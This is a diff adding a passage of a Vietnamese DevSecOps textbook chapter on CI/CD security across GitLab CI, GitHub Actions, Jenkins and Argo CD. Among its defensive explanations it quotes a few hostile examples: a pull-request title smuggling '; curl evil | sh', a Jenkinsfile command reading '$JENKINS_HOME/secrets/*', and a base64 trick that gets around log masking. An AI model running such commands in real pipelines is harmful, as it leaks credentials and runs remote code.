+<td><code>push</code>, <code>merge_request_event</code>, <code>schedule</code>, <code>web</code>, <code>trigger</code></td>
+</tr>
+<tr>
+<td><code>CI_COMMIT_SHA</code></td>
+<td>SHA commit đầy đủ (40 hex = 160 bit SHA-1)</td>
+<td><code>9b2c...</code></td>
+</tr>
+<tr>
+<td><code>CI_COMMIT_REF_NAME</code></td>
+<td>Tên branch/tag</td>
+<td><code>main</code></td>
+</tr>
+<tr>
+<td><code>CI_JOB_TOKEN</code></td>
+<td>Token tạm thời, sống trong vòng đời job</td>
+<td>(ẩn)</td>
+</tr>
+<tr>
+<td><code>CI_REGISTRY</code> / <code>CI_REGISTRY_IMAGE</code></td>
+<td>Registry tích hợp</td>
+<td><code>registry.gitlab.com/group/proj</code></td>
+</tr>
+<tr>
+<td><code>CI_PROJECT_DIR</code></td>
+<td>Thư mục checkout</td>
+<td><code>/builds/group/proj</code></td>
+</tr>
+<tr>
+<td><code>CI_DEFAULT_BRANCH</code></td>
+<td>Branch mặc định</td>
+<td><code>main</code></td>
+</tr>
+</tbody>
+</table>
+<p><code>CI_JOB_TOKEN</code> đáng chú ý về bảo mật: nó cho phép job truy cập một số API GitLab và pull/push registry của chính project. Phạm vi của nó cấu hình được trong <strong>CI/CD → Token Access</strong>; cấu hình quá rộng cho phép project A đọc project B.</p>
+<h3 id="ch07-724-runner-va-executor-chi-tiet-luong-đang-ky">7.2.4. Runner và Executor — chi tiết luồng đăng ký</h3>
+<p><strong>Runner</strong> là một agent (binary <code>gitlab-runner</code>, viết bằng Go) đăng ký với GitLab. Khi có job, GitLab giao job cho runner có tag phù hợp. Runner dùng một <strong>executor</strong> để thực thi.</p>
+<table>
+<thead>
+<tr>
+<th>Executor</th>
+<th>Cách chạy job</th>
+<th>Cách ly</th>
+<th>Dùng khi</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>shell</code></td>
+<td>Chạy trực tiếp trên host của runner</td>
+<td><strong>Không</strong> (chia sẻ FS, user)</td>
+<td>Lab nhỏ; rủi ro cao</td>
+</tr>
+<tr>
+<td><code>docker</code></td>
+<td>Mỗi job trong một container mới từ <code>image:</code></td>
+<td>Container-level</td>
+<td>Phổ biến nhất</td>
+</tr>
+<tr>
+<td><code>docker+machine</code></td>
+<td>Spin VM theo nhu cầu</td>
+<td>VM-level</td>
+<td>Autoscale</td>
+</tr>
+<tr>
+<td><code>kubernetes</code></td>
+<td>Mỗi job là một Pod</td>
+<td>Pod/namespace</td>
+<td>Cluster lớn</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Luồng đăng ký runner (registration), từng bước:</strong></p>
+<pre><code>1. Admin tạo runner trong UI → GitLab sinh &quot;runner authentication token&quot; (prefix glrt-)
+2. Trên máy runner: gitlab-runner register --url https://gitlab.example.com --token glrt-xxxx
+3. Runner gọi POST /api/v4/runners/verify với token → GitLab xác nhận
+4. Cấu hình ghi vào /etc/gitlab-runner/config.toml
+5. gitlab-runner run: long-poll POST /api/v4/jobs/request mỗi vài giây
+6. Khi có job → GitLab trả JSON job (script, variables, dependencies, artifacts URL)
+7. Runner thực thi qua executor, stream log (PATCH /api/v4/jobs/:id/trace), trả trạng thái
+</code></pre>
+<p><code>config.toml</code> mẫu (executor docker):</p>
+<pre><code class="language-toml">concurrent = 4
+check_interval = 3
+
+[[runners]]
+  name = &quot;docker-runner-01&quot;
+  url = &quot;https://gitlab.example.com&quot;
+  token = &quot;glrt-REDACTED&quot;
+  executor = &quot;docker&quot;
+  [runners.docker]
+    image = &quot;alpine:3.20&quot;
+    privileged = false          # Lưu ý: privileged=true ⇒ dễ thoát container ra host
+    volumes = [&quot;/cache&quot;]
+    pull_policy = [&quot;if-not-present&quot;]
+</code></pre>
+<p><strong>Lưu ý bảo mật runner:</strong>
+- <code>privileged = true</code> (thường bật để chạy Docker-in-Docker) cho phép job thoát ra host. Tách runner privileged sang môi trường cách ly.
+- <code>shell</code> executor + runner shared = một MR độc hại chạy lệnh trên host runner. Không bao giờ dùng shell executor cho repo public/untrusted.
+- Mount <code>/var/run/docker.sock</code> vào job = trao quyền root host. Tránh tuyệt đối với runner shared.</p>
+<h3 id="ch07-725-bien-masked-va-protected-co-che-chinh-xac">7.2.5. Biến masked và protected — cơ chế chính xác</h3>
+<p>Trong <strong>Settings → CI/CD → Variables</strong>:</p>
+<ul>
+<li><strong>Masked:</strong> GitLab thay thế giá trị bằng <code>[MASKED]</code> trong <strong>log</strong>. Ràng buộc kỹ thuật để mask được: giá trị phải là một dòng, độ dài tối thiểu (mặc định 8 ký tự), và chỉ chứa tập ký tự được phép (kiểm chứng theo version). Masking <strong>chỉ che log</strong>, không chống được nếu job in <code>echo $VAR | base64</code> (đã biến đổi → không khớp pattern mask).</li>
+<li><strong>Protected:</strong> biến chỉ được tiêm vào job chạy trên <strong>branch/tag protected</strong>. Mục đích: ngăn MR từ branch thường (do attacker tạo) đọc secret production.</li>
+</ul>
+<pre><code class="language-yaml">deploy-prod:
+  stage: deploy
+  environment: production
+  script:
+    - echo &quot;Deploying with token...&quot;
+    - curl -H &quot;PRIVATE-TOKEN: $PROD_DEPLOY_TOKEN&quot; &quot;$DEPLOY_API&quot;
+  rules:
+    - if: '$CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH'   # main là protected
+</code></pre>
+<p><code>$PROD_DEPLOY_TOKEN</code> được đánh dấu Protected + Masked → MR từ <code>feature/x</code> không nhận được biến này.</p>
+<p><strong>Lỗ hổng kinh điển:</strong> biến protected nhưng branch không được set protected trong <strong>Settings → Repository → Protected branches</strong> ⇒ bảo vệ vô hiệu. Hai cấu hình phải khớp nhau.</p>
+<h3 id="ch07-726-artifacts-vs-cache">7.2.6. <code>artifacts</code> vs <code>cache</code></h3>
+<table>
+<thead>
+<tr>
+<th></th>
+<th><code>artifacts</code></th>
+<th><code>cache</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Mục đích</td>
+<td>Truyền output giữa stage, tải về</td>
+<td>Tăng tốc (reuse dependency)</td>
+</tr>
+<tr>
+<td>Đảm bảo tồn tại</td>
+<td>Có (trong vòng đời pipeline)</td>
+<td>Không (best-effort)</td>
+</tr>
+<tr>
+<td>Key</td>
+<td>Theo job</td>
+<td><code>cache:key</code> (vd theo <code>$CI_COMMIT_REF_SLUG</code>)</td>
+</tr>
+<tr>
+<td>Lưu</td>
+<td>GitLab object storage</td>
+<td>Object storage / local runner</td>
+</tr>
+</tbody>
+</table>
+<pre><code class="language-yaml">build:
+  stage: build
+  script: [&quot;npm ci&quot;, &quot;npm run build&quot;]
+  cache:
+    key: &quot;$CI_COMMIT_REF_SLUG&quot;
+    paths: [&quot;node_modules/&quot;]
+  artifacts:
+    paths: [&quot;dist/&quot;]
+    expire_in: 1 week
+    reports:
+      sast: gl-sast-report.json   # report đặc biệt → hiện trên Security Dashboard
+</code></pre>
+<p><strong>Bảo mật:</strong> <code>artifacts</code> có thể vô tình đóng gói secret (vd file <code>.env</code>, <code>kubeconfig</code>). Cache poisoning: nếu cache key trùng giữa branch tin cậy và không tin cậy, attacker đầu độc <code>node_modules</code> cache rồi branch tin cậy dùng lại. Tách cache key theo ref.</p>
+<h3 id="ch07-727-vi-du-pipeline-that-test-sast-deploy">7.2.7. Ví dụ pipeline thật: test + SAST + deploy</h3>
+<pre><code class="language-yaml">stages: [build, test, security, package, deploy]
+
+default:
+  image: node:20-alpine
+
+variables:
+  IMAGE: &quot;$CI_REGISTRY_IMAGE:$CI_COMMIT_SHORT_SHA&quot;
+
+# SAST + Dependency scanning dùng template chính thức của GitLab
+include:
+  - template: Security/SAST.gitlab-ci.yml
+  - template: Security/Dependency-Scanning.gitlab-ci.yml
+
+build:
+  stage: build
+  script: [&quot;npm ci&quot;, &quot;npm run build&quot;]
+  artifacts: { paths: [&quot;dist/&quot;], expire_in: 1h }
+
+unit-test:
+  stage: test
+  script: [&quot;npm test -- --ci --reporters=default --reporters=jest-junit&quot;]
+  artifacts:
+    reports: { junit: junit.xml }
+
+container-build:
+  stage: package
+  image: docker:27
+  services: [&quot;docker:27-dind&quot;]
+  variables: { DOCKER_TLS_CERTDIR: &quot;/certs&quot; }
+  script:
+    - docker login -u &quot;$CI_REGISTRY_USER&quot; -p &quot;$CI_REGISTRY_PASSWORD&quot; &quot;$CI_REGISTRY&quot;
+    - docker build -t &quot;$IMAGE&quot; .
+    - docker push &quot;$IMAGE&quot;
+  rules:
+    - if: '$CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH'
+
+deploy-staging:
+  stage: deploy
+  image: bitnami/kubectl:1.30
+  environment: { name: staging, url: https://staging.example.com }
+  script:
+    - kubectl set image deployment/app app=&quot;$IMAGE&quot; -n staging
+  rules:
+    - if: '$CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH'
+
+deploy-prod:
+  stage: deploy
+  image: bitnami/kubectl:1.30
+  environment: { name: production, url: https://app.example.com }
+  when: manual                       # gate Continuous Delivery
+  script:
+    - kubectl set image deployment/app app=&quot;$IMAGE&quot; -n production
+  rules:
+    - if: '$CI_COMMIT_BRANCH == $CI_DEFAULT_BRANCH'
+</code></pre>
+<p>Output mẫu (trace log job <code>unit-test</code>, rút gọn):</p>
+<pre><code>Running with gitlab-runner 17.x (docker)
+Preparing the &quot;docker&quot; executor
+Using docker image node:20-alpine ...
+$ npm test -- --ci ...
+PASS  src/app.test.js
+Test Suites: 12 passed, 12 total
+Tests:       48 passed, 48 total
+Uploading artifacts for successful job
+  junit.xml: found 1 matching artifact files
+Job succeeded
+</code></pre>
+<hr />
+<h2 id="ch07-73-github-actions">7.3. GitHub Actions</h2>
+<h3 id="ch07-731-mo-hinh-workflow-job-step">7.3.1. Mô hình: workflow → job → step</h3>
+<p>File workflow nằm trong <code>.github/workflows/*.yml</code>. Một <strong>workflow</strong> chứa nhiều <strong>job</strong>; mỗi job chạy trên một <strong>runner</strong> (VM/container); mỗi job có nhiều <strong>step</strong>; step hoặc chạy <code>run:</code> (shell) hoặc <code>uses:</code> (một <strong>action</strong> tái sử dụng).</p>
+<table>
+<thead>
+<tr>
+<th>Cấp</th>
+<th>Khóa chính</th>
+<th>Ghi chú</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Workflow</td>
+<td><code>name</code>, <code>on</code>, <code>permissions</code>, <code>env</code>, <code>concurrency</code>, <code>jobs</code></td>
+<td><code>on</code> định nghĩa trigger</td>
+</tr>
+<tr>
+<td>Job</td>
+<td><code>runs-on</code>, <code>needs</code>, <code>if</code>, <code>strategy</code>, <code>permissions</code>, <code>steps</code>, <code>environment</code>, <code>outputs</code></td>
+<td><code>needs</code> tạo phụ thuộc</td>
+</tr>
+<tr>
+<td>Step</td>
+<td><code>uses</code>, <code>with</code>, <code>run</code>, <code>env</code>, <code>id</code>, <code>if</code></td>
+<td><code>with</code> truyền input cho action</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ch07-732-on-trigger-chi-tiet">7.3.2. <code>on</code> — trigger chi tiết</h3>
+<pre><code class="language-yaml">on:
+  push:
+    branches: [&quot;main&quot;]
+    paths: [&quot;src/**&quot;]
+  pull_request:
+    types: [opened, synchronize, reopened]
+  workflow_dispatch:          # bấm tay
+    inputs:
+      environment:
+        type: choice
+        options: [staging, production]
+  schedule:
+    - cron: &quot;0 2 * * *&quot;       # 02:00 UTC mỗi ngày
+</code></pre>
+<p><strong>Khác biệt bảo mật cực kỳ quan trọng — <code>pull_request</code> vs <code>pull_request_target</code>:</strong></p>
+<table>
+<thead>
+<tr>
+<th>Trigger</th>
+<th>Code chạy</th>
+<th>Secrets có sẵn</th>
+<th><code>GITHUB_TOKEN</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>pull_request</code></td>
+<td>Code của <strong>PR</strong> (fork)</td>
+<td><strong>Không</strong> (mặc định)</td>
+<td>Read-only mặc định</td>
+</tr>
+<tr>
+<td><code>pull_request_target</code></td>
+<td>Workflow của <strong>base branch</strong></td>
+<td><strong>Có</strong></td>
+<td>Read/write</td>
+</tr>
+</tbody>
+</table>
+<p><code>pull_request_target</code> chạy trong ngữ cảnh repo gốc <strong>với secrets</strong>, nhưng nếu nó checkout và thực thi code của PR (<code>ref: ${{ github.event.pull_request.head.sha }}</code>) thì attacker từ fork đọc được mọi secret. Đây là lỗ hổng phổ biến nhất trong GitHub Actions.</p>
+<h3 id="ch07-733-github_token-va-permissions">7.3.3. <code>GITHUB_TOKEN</code> và <code>permissions</code></h3>
+<p>Mỗi run nhận một <code>GITHUB_TOKEN</code> tạm thời (hết hạn khi job xong). Phạm vi của nó điều khiển bằng <code>permissions</code>:</p>
+<pre><code class="language-yaml">permissions:
+  contents: read        # mặc định nên là read
+  packages: write       # cần để push GHCR
+  id-token: write       # BẮT BUỘC cho OIDC
+</code></pre>
+<p>Nguyên tắc least privilege: đặt <code>permissions: { contents: read }</code> ở cấp workflow, nâng quyền cụ thể chỉ ở job cần.</p>
+<h3 id="ch07-734-secrets-masking-va-oidc">7.3.4. Secrets, masking và OIDC</h3>
+<ul>
+<li><strong>Secrets</strong> (<code>${{ secrets.NAME }}</code>): lưu mã hóa, tự động masked trong log (thay bằng <code>***</code>). Như GitLab, masking chỉ che giá trị nguyên văn — biến đổi qua base64/cắt chuỗi sẽ lộ.</li>
+<li><strong>OIDC (OpenID Connect):</strong> thay vì lưu credential cloud tĩnh, runner xin một <strong>JWT ngắn hạn</strong> từ GitHub, cloud (AWS/GCP/Azure) tin GitHub làm IdP và đổi JWT lấy credential tạm.</li>
+</ul>
+<p>Cấu trúc JWT OIDC của GitHub (JWT = 3 phần Base64URL ngăn bởi <code>.</code>):</p>
+<pre><code>header.payload.signature
+</code></pre>
+<table>
+<thead>
+<tr>
+<th>Phần</th>
+<th>Nội dung</th>
+<th>Ví dụ field</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Header</td>
+<td><code>{"alg":"RS256","kid":"...","typ":"JWT"}</code></td>
+<td>thuật toán ký RSA-256</td>
+</tr>
+<tr>
+<td>Payload</td>
+<td>claims</td>
+<td><code>iss</code>, <code>sub</code>, <code>aud</code>, <code>exp</code>, <code>repository</code>, <code>ref</code></td>
+</tr>
+<tr>
+<td>Signature</td>
+<td>RSASSA-PKCS1-v1_5 trên SHA-256</td>
+<td>256 byte với khóa RSA-2048</td>
+</tr>
+</tbody>
+</table>
+<p>Claim <code>sub</code> (subject) là cốt lõi của trust policy. Ví dụ:</p>
+<pre><code>sub = repo:my-org/my-repo:ref:refs/heads/main
+iss = https://token.actions.githubusercontent.com
+aud = sts.amazonaws.com
+</code></pre>
+<p>Trust policy AWS phải khóa chặt <code>sub</code>:</p>
+<pre><code class="language-json">{
+  &quot;Effect&quot;: &quot;Allow&quot;,
+  &quot;Principal&quot;: {&quot;Federated&quot;: &quot;arn:aws:iam::123456789012:oidc-provider/token.actions.githubusercontent.com&quot;},
+  &quot;Action&quot;: &quot;sts:AssumeRoleWithWebIdentity&quot;,
+  &quot;Condition&quot;: {
+    &quot;StringEquals&quot;: {&quot;token.actions.githubusercontent.com:aud&quot;: &quot;sts.amazonaws.com&quot;},
+    &quot;StringLike&quot;: {&quot;token.actions.githubusercontent.com:sub&quot;: &quot;repo:my-org/my-repo:ref:refs/heads/main&quot;}
+  }
+}
+</code></pre>
+<p><strong>Lỗ hổng:</strong> dùng <code>StringLike</code> với <code>repo:my-org/*:*</code> cho phép <strong>bất kỳ branch/PR nào</strong> của org assume role. Phải pin <code>ref</code> hoặc dùng <code>environment</code>.</p>
+<h3 id="ch07-735-uses-va-pinning-action">7.3.5. <code>uses</code> và pinning action</h3>
+<p><code>uses: actions/checkout@v4</code> tham chiếu action. Tham chiếu có thể là tag (<code>@v4</code>), branch (<code>@main</code>), hoặc <strong>commit SHA</strong> (<code>@8f4b...</code>).</p>
+<table>
+<thead>
+<tr>
+<th>Cách pin</th>
+<th>Ổn định</th>
+<th>An toàn</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>@main</code></td>
+<td>Thấp</td>
+<td>Thấp — owner đẩy commit mới = chạy code mới</td>
+</tr>
+<tr>
+<td><code>@v4</code> (tag)</td>
+<td>Trung bình</td>
+<td>Trung bình — tag có thể bị move</td>
+</tr>
+<tr>
+<td><code>@&lt;full-40-hex-SHA&gt;</code></td>
+<td>Cao</td>
+<td>Cao — SHA bất biến</td>
+</tr>
+</tbody>
+</table>
+<p><strong>Khuyến nghị bảo mật:</strong> pin action third-party theo <strong>full SHA-1 40 ký tự</strong> (160 bit), kèm comment tag để đọc:</p>
+<pre><code class="language-yaml">- uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
+</code></pre>
+<h3 id="ch07-736-vi-du-workflow-that-matrix-test-sast-build-oidc-deploy">7.3.6. Ví dụ workflow thật: matrix test + SAST + build + OIDC deploy</h3>
+<pre><code class="language-yaml">name: ci
+on:
+  pull_request:
+  push: { branches: [main] }
+
+permissions:
+  contents: read
+
+jobs:
+  test:
+    runs-on: ubuntu-latest
+    strategy:
+      fail-fast: false
+      matrix:
+        node: [20, 22, 24]   # Node 18 đã EOL — pin theo các bản còn hỗ trợ (cần kiểm chứng)
+    steps:
+      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11  # v4.1.1
+      - uses: actions/setup-node@1d0ff469b7ec7b3cb9d8673fde0c81c44821de2a  # v4.2.0
+        with: { node-version: &quot;${{ matrix.node }}&quot; }
+      - run: npm ci
+      - run: npm test
+
+  codeql:
+    runs-on: ubuntu-latest
+    permissions: { security-events: write, contents: read }
+    steps:
+      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
+      - uses: github/codeql-action/init@v3
+        with: { languages: javascript }
+      - uses: github/codeql-action/analyze@v3
+
+  deploy:
+    needs: [test, codeql]
+    if: github.ref == 'refs/heads/main'
+    runs-on: ubuntu-latest
+    environment: production
+    permissions:
+      id-token: write        # OIDC
+      contents: read
+    steps:
+      - uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11
+      - uses: aws-actions/configure-aws-credentials@e3dd6a429d7300a6a4c196c26e071d42e0343502  # v4.0.2
+        with:
+          role-to-assume: arn:aws:iam::123456789012:role/gha-deploy
+          aws-region: ap-southeast-1
+      - run: aws s3 sync ./dist s3://my-bucket --delete
+</code></pre>
+<p><strong>Marketplace action</strong> (<code>aws-actions/configure-aws-credentials</code>): nhận <code>role-to-assume</code>, gọi <code>sts:AssumeRoleWithWebIdentity</code> bằng JWT OIDC lấy từ <code>id-token: write</code>, set biến môi trường <code>AWS_ACCESS_KEY_ID</code>/<code>AWS_SECRET_ACCESS_KEY</code>/<code>AWS_SESSION_TOKEN</code> cho các step sau.</p>
+<h3 id="ch07-737-luu-y-bao-mat-github-actions-tong-hop">7.3.7. Lưu ý bảo mật GitHub Actions tổng hợp</h3>
+<ul>
+<li><strong>Script injection qua context:</strong> <code>run: echo "${{ github.event.pull_request.title }}"</code> — nếu title chứa <code>"; curl evil | sh</code> thì lệnh được nội suy <strong>trước</strong> khi shell chạy → RCE. Cách an toàn: đưa vào biến môi trường rồi tham chiếu <code>"$TITLE"</code>.</li>
+<li>Tắt <code>Allow all actions</code> ở org; whitelist action theo verified creator + SHA.</li>
+<li>Đặt mặc định <code>permissions</code> tối thiểu ở cấp org/repo.</li>
+</ul>
+<hr />
+<h2 id="ch07-74-jenkins">7.4. Jenkins</h2>
+<h3 id="ch07-741-kien-truc-controlleragent">7.4.1. Kiến trúc controller/agent</h3>
+<ul>
+<li><strong>Controller</strong> (trước gọi "master"): web UI, scheduler, lưu config, điều phối build. Nên <strong>không</strong> chạy build trên controller (build executors = 0) để tránh code build truy cập filesystem controller.</li>
+<li><strong>Agent</strong> (trước "slave"): node thực thi build. Kết nối qua <strong>SSH</strong>, <strong>JNLP/inbound (TCP)</strong>, hoặc agent động (Kubernetes/Docker plugin).</li>
+</ul>
+<pre><code>   Developer ──push──&gt; SCM (Git)
+        │ webhook
+        ▼
+  ┌───────────────┐   giao build    ┌──────────┐
+  │  Controller   │ ───────────────&gt;│ Agent A  │ (linux, label: docker)
+  │  (UI, queue)  │ &lt;──── log ──────│ Agent B  │ (windows)
+  └───────────────┘                 └──────────┘
+</code></pre>
+<p>Giao thức inbound agent (JNLP) bắt tay qua cổng TCP cấu hình. Agent xác thực bằng <strong>secret</strong> do controller cấp. <strong>Lưu ý:</strong> mở cổng agent ra Internet + secret yếu = nguy cơ RCE trên controller.</p>
+<h3 id="ch07-742-jenkinsfile-declarative-vs-scripted">7.4.2. Jenkinsfile declarative vs scripted</h3>
+<p>Jenkins Pipeline dùng Groovy DSL. Hai phong cách:</p>
+<ul>
+<li><strong>Declarative:</strong> cấu trúc cố định (<code>pipeline { agent ... stages ... }</code>), validate được, dễ đọc. Khuyến nghị.</li>
+<li><strong>Scripted:</strong> Groovy thuần (<code>node { ... }</code>), linh hoạt nhưng dễ sai và khó audit.</li>
+</ul>
+<h4 id="ch07-declarative-khoi-chinh">Declarative — khối chính</h4>
+<table>
+<thead>
+<tr>
+<th>Khối</th>
+<th>Bắt buộc</th>
+<th>Ý nghĩa</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>pipeline</code></td>
+<td>Có</td>
+<td>Bao ngoài cùng</td>
+</tr>
+<tr>
+<td><code>agent</code></td>
+<td>Có</td>
+<td>Node/label/docker chạy pipeline</td>
+</tr>
+<tr>
+<td><code>stages</code> → <code>stage</code> → <code>steps</code></td>
+<td>Có</td>
+<td>Đơn vị công việc</td>
+</tr>
+<tr>
+<td><code>environment</code></td>
+<td>Không</td>
+<td>Biến môi trường (có thể đọc credentials)</td>
+</tr>
+<tr>
+<td><code>options</code></td>
+<td>Không</td>
+<td>timeout, retry, buildDiscarder</td>
+</tr>
+<tr>
+<td><code>parameters</code></td>
+<td>Không</td>
+<td>Input khi trigger</td>
+</tr>
+<tr>
+<td><code>when</code></td>
+<td>Không</td>
+<td>Điều kiện chạy stage</td>
+</tr>
+<tr>
+<td><code>post</code></td>
+<td>Không</td>
+<td>Hành động sau (<code>always</code>, <code>success</code>, <code>failure</code>, <code>unstable</code>)</td>
+</tr>
+</tbody>
+</table>
+<h4 id="ch07-scripted-vi-du-toi-gian">Scripted — ví dụ tối giản</h4>
+<pre><code class="language-groovy">node('docker') {
+    stage('Build') { sh 'npm ci &amp;&amp; npm run build' }
+    stage('Test')  { sh 'npm test' }
+}
+</code></pre>
+<h3 id="ch07-743-credentials-co-che">7.4.3. Credentials — cơ chế</h3>
+<p>Jenkins <strong>Credentials</strong> lưu secret mã hóa, tham chiếu bằng ID. Trong pipeline dùng <code>credentials()</code> hoặc <code>withCredentials</code>:</p>
+<pre><code class="language-groovy">environment {
+    AWS_CRED = credentials('aws-deploy')   // tạo AWS_CRED_USR và AWS_CRED_PSW
+}
+</code></pre>
+<p>Hoặc binding tường minh:</p>
+<pre><code class="language-groovy">withCredentials([string(credentialsId: 'prod-token', variable: 'TOKEN')]) {
+    sh 'curl -H &quot;Authorization: Bearer $TOKEN&quot; https://api.example.com/deploy'
+}
+</code></pre>
+<p>Jenkins tự động <strong>mask</strong> giá trị credential trong console log. Nhưng giống các hệ khác, biến đổi giá trị (in từng phần) làm lộ. Lưu ý: tránh dùng <code>sh "echo ${TOKEN}"</code> (Groovy interpolation, nội suy ngoài shell, dễ lộ + injection) — dùng <code>sh 'echo $TOKEN'</code> (single quote, shell tự đọc env).</p>
+<h3 id="ch07-744-vi-du-jenkinsfile-that-declarative">7.4.4. Ví dụ Jenkinsfile thật (declarative)</h3>
+<pre><code class="language-groovy">pipeline {
+    agent { label 'docker' }
+
+    options {
+        timeout(time: 30, unit: 'MINUTES')
+        buildDiscarder(logRotator(numToKeepStr: '20'))
+        disableConcurrentBuilds()
+    }
+
+    environment {
+        IMAGE      = &quot;registry.example.com/app:${env.GIT_COMMIT.take(8)}&quot;
+        REGISTRY   = credentials('registry-creds')   // REGISTRY_USR / REGISTRY_PSW
+    }
+
+    stages {
+        stage('Build') {
+            steps { sh 'npm ci &amp;&amp; npm run build' }
+        }
+
+        stage('Test') {
+            steps { sh 'npm test -- --ci' }
+            post { always { junit 'junit.xml' } }
+        }
+
+        stage('SAST') {
+            steps {
+                sh 'docker run --rm -v &quot;$PWD:/src&quot; semgrep/semgrep semgrep --config=auto --error /src'   // image chính thức (org đổi tên từ returntocorp)
+            }
+        }
+
+        stage('Package &amp; Push') {
+            when { branch 'main' }
+            steps {
+                sh 'echo &quot;$REGISTRY_PSW&quot; | docker login registry.example.com -u &quot;$REGISTRY_USR&quot; --password-stdin'
+                sh 'docker build -t &quot;$IMAGE&quot; .'
+                sh 'docker push &quot;$IMAGE&quot;'
+            }
+        }
+
+        stage('Deploy Prod') {
+            when { branch 'main' }
+            steps {
+                input message: 'Deploy to production?', ok: 'Deploy'   // gate thủ công
+                sh 'kubectl set image deployment/app app=&quot;$IMAGE&quot; -n production'
+            }
+        }
+    }
+
+    post {
+        failure { echo 'Build failed — gửi cảnh báo' }
+        always  { cleanWs() }
+    }
+}
+</code></pre>
+<p>Output mẫu (console, rút gọn):</p>
+<pre><code>[Pipeline] stage (Test)
++ npm test -- --ci
+Tests: 48 passed
+[Pipeline] junit
+Recording test results
+[Pipeline] stage (Deploy Prod)
+Input requested: Deploy to production? -&gt; (Proceed / Abort)
+</code></pre>
+<h3 id="ch07-745-plugin-va-be-mat-tan-cong">7.4.5. Plugin và bề mặt tấn công</h3>
+<p>Jenkins là plugin-driven (hàng nghìn plugin). Mỗi plugin là một bề mặt tấn công. Các vấn đề kinh điển:
+- <strong>Script Security / Groovy sandbox:</strong> pipeline Groovy chạy trong sandbox; method ngoài whitelist cần admin approve (Manage Jenkins → In-process Script Approval). Bỏ qua sandbox = RCE.
+- <strong>CVE plugin:</strong> cập nhật trễ → lỗ hổng đã công bố bị khai thác.
+- <strong>Build executor trên controller:</strong> nếu để &gt; 0, một Jenkinsfile độc hại <code>sh 'cat $JENKINS_HOME/secrets/*'</code> trộm key giải mã credentials.</p>
+<p><strong>Phòng thủ:</strong> controller executors = 0, agent ephemeral (K8s pod mỗi build), bật CSRF protection, cập nhật plugin, RBAC qua Matrix/Role Strategy plugin, audit qua Audit Trail plugin.</p>
+<hr />
+<h2 id="ch07-75-argo-cd-gitops">7.5. Argo CD &amp; GitOps</h2>
+<h3 id="ch07-751-nguyen-ly-git-la-single-source-of-truth">7.5.1. Nguyên lý: Git là single source of truth</h3>
+<p>GitOps đảo ngược mô hình "CI push tới cluster". Thay vào đó:
+1. Trạng thái mong muốn (desired state) của hệ thống được khai báo <strong>declarative</strong> trong Git (manifest K8s, Helm, Kustomize).
+2. Một <strong>agent trong cluster</strong> (Argo CD) liên tục so sánh <strong>desired state (Git)</strong> với <strong>live state (cluster)</strong> và <strong>reconcile</strong> (đồng bộ) để khớp.</p>
+<table>
+<thead>
+<tr>
+<th>Tiêu chí</th>
+<th>CI-push (kubectl từ pipeline)</th>
+<th>GitOps (pull, Argo CD)</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Ai chạm cluster</td>
+<td>Pipeline (cần credential cluster đặt ở CI)</td>
+<td>Agent trong cluster (credential không rời cluster)</td>
+</tr>
+<tr>
+<td>Single source of truth</td>
+<td>Trạng thái thực tế cluster</td>
+<td>Git</td>
+</tr>
+<tr>
+<td>Drift detection</td>
+<td>Không</td>
+<td>Có (live vs desired)</td>
+</tr>
+<tr>
+<td>Credential cluster</td>
+<td>Lưu ở CI (rủi ro)</td>
+<td>Không cần export ra ngoài</td>
+</tr>
+<tr>
+<td>Audit</td>
+<td>Log pipeline</td>
+<td>Git history (mọi thay đổi = commit)</td>
+</tr>
+<tr>
+<td>Rollback</td>
+<td>Chạy lại pipeline</td>
+<td><code>git revert</code></td>
+</tr>
+</tbody>
+</table>
+<p><strong>Vì sao GitOps an toàn hơn về credential:</strong> trong CI-push, kubeconfig/admin token nằm trong secret CI — bề mặt tấn công lớn (mọi job có thể lạm dụng). Trong GitOps, Argo CD trong cluster tự kéo và áp manifest; không cần credential cluster rời khỏi cluster.</p>
+<h3 id="ch07-752-reconcile-loop-state-machine-chi-tiet">7.5.2. Reconcile loop — state machine chi tiết</h3>
+<pre><code>        ┌──────────────────────────────────────────────────┐
+        │                  RECONCILE LOOP                    │
+        │  (mặc định mỗi ~180s + webhook + manual sync)      │
+        └──────────────────────────────────────────────────┘
+   1. Lấy desired state: clone/pull repo @ targetRevision
+   2. Render manifest (Helm template / Kustomize build / plain)
+   3. Lấy live state: query Kubernetes API các resource
+   4. Diff desired vs live (normalize: bỏ field do cluster sinh)
+   5. Tính SYNC STATUS:
+        - Synced      : desired == live
+        - OutOfSync   : khác nhau (drift hoặc commit mới)
+   6. Tính HEALTH STATUS (per resource):
+        Healthy / Progressing / Degraded / Suspended / Missing
+   7. Nếu OutOfSync và auto-sync bật → apply (server-side apply)
+   8. Nếu selfHeal bật và drift thủ công → ghi đè về desired
+</code></pre>
+<p>Hai trục trạng thái <strong>độc lập</strong>:
+- <strong>Sync status:</strong> Git có khớp cluster không.
+- <strong>Health status:</strong> resource có hoạt động tốt không (vd Deployment đủ replica ready).</p>
+<h3 id="ch07-753-application-crd-tung-field">7.5.3. Application CRD — từng field</h3>
+<p>Argo CD định nghĩa một <strong>Application</strong> (CRD <code>argoproj.io/v1alpha1</code>):</p>
+<pre><code class="language-yaml">apiVersion: argoproj.io/v1alpha1
+kind: Application
+metadata:
+  name: my-app
+  namespace: argocd
+  finalizers:
+    - resources-finalizer.argocd.argoproj.io   # cascade xóa resource khi xóa App
+spec:
+  project: default
+  source:
+    repoURL: https://github.com/my-org/k8s-manifests.git
+    targetRevision: main          # branch/tag/commit
+    path: apps/my-app/overlays/prod
